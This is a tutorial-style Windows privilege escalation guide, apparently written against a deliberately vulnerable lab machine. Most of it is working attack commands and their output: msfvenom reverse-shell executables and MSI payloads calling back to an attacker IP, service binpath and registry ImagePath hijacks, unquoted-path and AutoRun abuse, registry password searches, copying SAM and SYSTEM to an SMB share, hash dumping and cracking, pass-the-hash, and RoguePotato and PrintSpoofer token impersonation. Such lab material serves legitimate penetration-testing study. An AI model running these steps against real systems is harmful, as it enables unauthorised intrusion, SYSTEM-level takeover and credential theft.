# Windows Privilege Escalation Guide


Let's make hands dry in Windows Privilege Escalation.
<!--more-->

In order to deploy windows machine in linux we require `xfreerdp` or `remmina`tool along with username and password. 

**For xfreerdp**
```bash
root@gr4n173:~$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.13.134
```


**For remmina**
We have can run directly a tool and login with `username` and `password`.


## 1. Generate a Reverse Shell Executable
On Kali machine we can use `msfvenom` to generate the reverse shell executables

```bash
root@gr4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.156 LPORT=53 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

From here to transfer this executable to windows, we can setup a Simple SMB Server of python in linux.
**Linux**
```bash
root@gr4n173:~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py gr4n173 .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

**In Window**
```bash
C:\User> copy \\10.10.14.156\gr4n173\reverse.exe C:\User\reverse.exe	
```

Now our task is to run the reverse shell executables in window to get the connection back before that we have to setup netcat listner on linux.
```bash
root@gr4n173:~$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.2.77.175] from (UNKNOWN) [10.10.130.32] 49795
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\User>whoami
whoami
gr4n173\user
```

This way we can get the reverse connection in linux of window machine.

## 2. Service Exploits
#service
### Insecure Service Permissions
#bin_path
On `Windows machine`, when escalating our privileges we go through the service that run under system privileges. Here services are like `binary executables` in linux. So inorder to execute our services we require the services to restart. Before going deep dive into service exploit let's try to check the services are run by `user` for that we use `accesschk.exe` . Download [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
`AccessChk` is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects etc.
```bash
#This give the detail about services that we have read/write permission
C:\gr4n173\accesschk.exe -uwcqv user *
RW daclsvc
 		SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```
|	Permissions		| Use of the services	|
| :----					   |    :-----:						 |	
|SRVICE\_CHANGE\_CONFIG |Can reconfigure the service binary|
| WRITE\_DAC |Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG|
| WRITE\_OWNER|Can become owner, reconfigure permissions|
|GENERIC\_WRITE|Inherits SERVICE\_CHANGE\_CONFIG|
|GENERIC\_ALL|Inherits SERVICE\_CHANGE\_CONFIG|

Now inorder to check under what privileges a system runs. For that we check for specific service `daclsvc`.
```bash
C:\gr4n173> sc qc daclsvc
SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
where:- 
`sc: Service Sontroller`
`qc: query configuration`
Now inorder exploit that service we have to change the `Binpath` of service `daclsvc` with the path of our `reverse.exe`.
```bash
C:\gr4n173> sc config daclsvc binpath="\"C:\gr4n173\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS
```
Since `binpath` is changed now we only have to do is run the service again along with listner set in `linux` and we are in.
```bash
C:\gr4n173> net start daclsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```
**Linux**
```bash
root@gr4n173~$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.2.77.175] from (UNKNOWN) [10.10.75.7] 49882
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>
```

### Unquoted Service Path
#unquotedsvc
Basically if path to the service binary isn't wrapped in quotes and there are spaces in the path then we can escalate privileges by abusing misconfigured services.

For ex:- If we use long file name that contains a space, use quoted strings indicate where file ends ;otherwise, the filename isn't ambiguous. string "C:\program files\testing service\unquoted Service ".

 `Unquotedsvc`  can be checked as
 ```bash
 C:\gr4n173>sc qc unquotedsvc
 SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
From there we can see the bin_path is unquoted and contain the spaces. Now in order to exploit that first we have to check who can `rw` that directory.
```bash
C:\grn4713>C:\gr4n173\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Now copying our `reverse.exe` executables in this directory and rename it to `Common.exe`. Since unquotedservice run the common file everytime.
```bash
C:\gr4n173>copy C:\gr4n173\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
This way we got the reverse connection in `linux` listner same as above.

### Week Registry Permissions
#regsvc
Now next service is the registry service i.e `regsvc`. Windows regisry also have ACL(Access Control List) and stores entries for each service in the machine. So if ACL is misconfigured then we can exploit it.

```bash
C:\gr4n173>sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

From there we can see the insecure registry location. We can find the location of `regsvc` using [winpeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe).

Now we have to check the permission on this service and found that user `NT AUTHORITY\INTERACTIVE` have `rw` permission.
```bash
C:\gr4n173\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```
So inorder to exploit this we have to change the directory of `ImagePath`. Before that let's query this registry.
```bash
C:\gr4n173>reg query HKLM\System\CurrentControlSet\Services\regsvc

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security
```
From there you can see the `ImagePath` location pointing to insecure registry. Let's change the path.
```bash
C:\gr4n173>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.
```
Where:
`/v:  The value name, under the selected Key, to add.`
`/t: RegKey data types
		[ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ |
		REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ]
		If omitted, REG_SZ is assumed.`
`/d:  The data to assign to the registry ValueName being added.`
`/f: Force overwriting the existing registry entry without prompt.`
Hence by starting `regsvc` we get the reverse shell conection in linux same as above.

### Insecure Service Executables
Here we will be exploiting `filepermsvc` service which can be done same as other service i.e. by changing the `bin_path` directory with the directory of our `reverse.exe`. 
```bash
C:\gr4n173>sc qc filepermsvc
```

Using accesschk.exe, note that the service binary (BINARY\_PATH\_NAME) file is writable by everyone:

```bash
C:\gr4n173\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

```bash
C:\gr4n173>copy C:\gr4n173\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

Start a listener on linux and then start the service to spawn a reverse shell running with SYSTEM privileges:

```bash
C:\gr4n173>net start filepermsvc
```

## 3. Registry
### AutoRuns
Query the registry for AutoRun executables:

```bash
C:\gr4n173>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```


Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```bash
C:\gr4n173\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

```bash
C:\gr4n173>copy C:\gr4n173\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!  

`rdesktop 10.10.107.23`

### AlwaysInstallElevated
When `AlwaysInstallElevated` is set for both `HKLM(HKEY\_LOCAL\_MACHINE)` and `HKCU(_HKEY\_CURRENT\_USER_)` in registry for every install program then, program automatically obtains system privileges. And another thing i.e. Windows environment provide a group policy settings which allows a regular user to install a Microsoft Windows Installer Package(MSI) with system privileges.
So from that prospective, here we have to set the both `HKLM`and `HKCU` then we can get the system. For that we have to `query` registry first.
```bash
C:\gr4n173>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
C:\gr4n173>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
Here both are set. Now our task is to install reverseshell as `msi` package for that we can use `msfvenom` and then transfer it to windows machine using `smb` server.
```bash
root@g4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.77.175 LPORT=53 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```
Now, it has been transfered to windows and if we try to run it with a listner on in kali then we get the shell with `SYSTEM privileges`.
```bash
C:\gr4n173>msiexec /quite /qn /i reverse.msi
```

## 4. Passwords
### Registry
We can search for the keys and values that contains word 'password' in registry using 
```bash
C:\gr4n173>reg query HKLM /f password /t REG_SZ	/s
C:\gr4n173>reg query HKCU /f password /t REG_SZ /s
.......
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword
End of search: 258 match(es) found.
```
To query for windows autologin which will display password and username
```bash
C:\gr4n173>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
C:\gr4n173>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
Now if we got the creds of `admin` then we can login using `winexe` in kali machine which is same as `ssh` in linux with creds.
```bash
root@gr4n173:~$ winexe -U 'admin%password' //10.10.26.193 cmd.exe
c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin
```

### Saved Creds
If we got the saved creds in `windows` machine then we can get the reverse connection using `savedcred`
To search for saved credentials
```bash
C:\gr4n173>cmdkey /list
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```
This indicate `admin` users creds is saved. Now to get the reverse connection we can `runas` with listner on in linux.
```bash
C:\gr4n173>runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
> **Note:** If you want to create the saved credential list in windows then we can use the following command.
> `C:\gr4n173> cmdkey /add:vulnerabl-pc /user:gr4n173 /pass:password`
**For more info:** visit here [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey).

### Security Account Manager (SAM)
Basically Windows user password hashes can be extracted using `SAM` and `SYSTEM` files. 
> In order to transfer files from `windows` machine to `linux` we can use same `smb` server and use `copy` command as
>  C:\gr4n173>copy FILENAME \\IP_address_of_linux\gr4n173\

```bash
C:\gr4n173>copy SAM \\10.2.77.175\gr4n173
```

Now to after transfer of files into linux machine we can download `creddump7` to dump out the hashes. You can download [creddump7](https://github.com/Tib3rius/creddump7).
```bash
root@gr4n173:~$ python3 creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:hashes over here:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:hashes overhere:::
```
Then after getting hashes we can crack the password using `hashcat`
```bash
root@gr4n173:~$ hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlist/rockyou.txt
```
### Passing the Hash
Kali Linux have a tool which allow to login using the username/passwordhash called `pth-winexe` and spawn a shell running as `admin`
```bash
root@gr4n173:~$ pth-winexe -U 'admin%hash_over_here' //10.10.26.193 cmd.exe
```

## 5. Scheduled Tasks
As in linux we use `cronjob` for scheduled tasks but here in `Windows` we can use `cleanup.ps1` script. This tools usually cleanup but only thing is it need to be run by `SYSTEM`. Download [here](https://github.com/kentgrav/PowerShell/blob/master/Windows-Cleanup.ps1).
To `cat` the file in `windows` we can use `type` command and can see it is run by `SYSTEM`.
```bash
C:\DevTools>type CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
```
Now our task is to replace `cleanup.ps1` script with `reverse.exe`. Then after certain time we can get the shell with listner on in linux.
```bash
C:\gr4n173> echo C:\gr4n173\reverse.exe >> C:\gr4n173\CleanUp.ps1
```

## 6. Startup Apps
Using accesschk.exe, note that the BUILTIN\\Users group can write files to the StartUp directory:
```bash
C:\gr4n173> accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

Using cscript, run the C:\\PrivEsc\\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
```bash
C:\gr4n173>cscript CreateShortcut.vbs
```

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

```bash
root@gr4n173:~$ rdesktop -u admin 10.10.8.98
```

A shell running as admin should connect back to your listener.

## 7.Token Impersonation
### Rogue Potato
 Here we abused `SeImpersonate` or `SeAssignPrimaryToken` privileges to get execution as SYSTEM using `roguePotato` exploit. 
 When we require more than 2 shell of windows in different port then we can use `RoguePotato` exploit.
 
 At first we have to port forward in kali which can be done using `socat`.
 ```bash
 root@gr4n173:~$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.8.98:9999
 ```
 `PsExec.exe`helps to execute the process remotely. Now in order to run `PSExec.exe`we require `administrator` privilege. So we can click on run->as administrator while opening cmd. Then only we can run the below command.
Using `PSExec64.exe` to trigger the reverse.exe executable with the permissions of the "local service" account:
 ```bash
 C:\gr4n173>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 ```
 Now again starting new listner on kali.
 
 Then, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges:
 ```bash
 C:\gr4n173> C:\gr4n173\RoguePotato.exe -r 10.10.10.10 -e "C:\gr4n173\reverse.exe" -l 9999
 ```
 > **For more info:** [0xdf blog](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html)
 
 
### PrintSpoofer
Here we use `PrintSpoofer` exploit to trigger a second shell as same in `RoguePotato` exploit.
1. Setting permissions of the "local serivce" account same as in above.
2. Now running the `PrintSpoofer` exploit as
```bash
C:\gr4n173>C:\gr4n173\PrintSpoofer.exe -c "C:\gr4n173\reverse.exe" -i
```
This way we get the reverse shell with SYSTEM privileges.

> **Resources:** Several tools have been written which help find potential privilege escalations on Windows. Among of them are writeen below.
> 1. [winPEASany.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md)
> 2. [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
> 3. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
> 4. [SharpUp.exe](https://github.com/GhostPack/SharpUp).
> **For more Windows Escalation Technique:**
>1. [payloadsallthings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
>2. [guif.re](https://guif.re/windowseop).
>3. [Script_and_payloads_by_Nishang](https://github.com/samratashok/nishang)


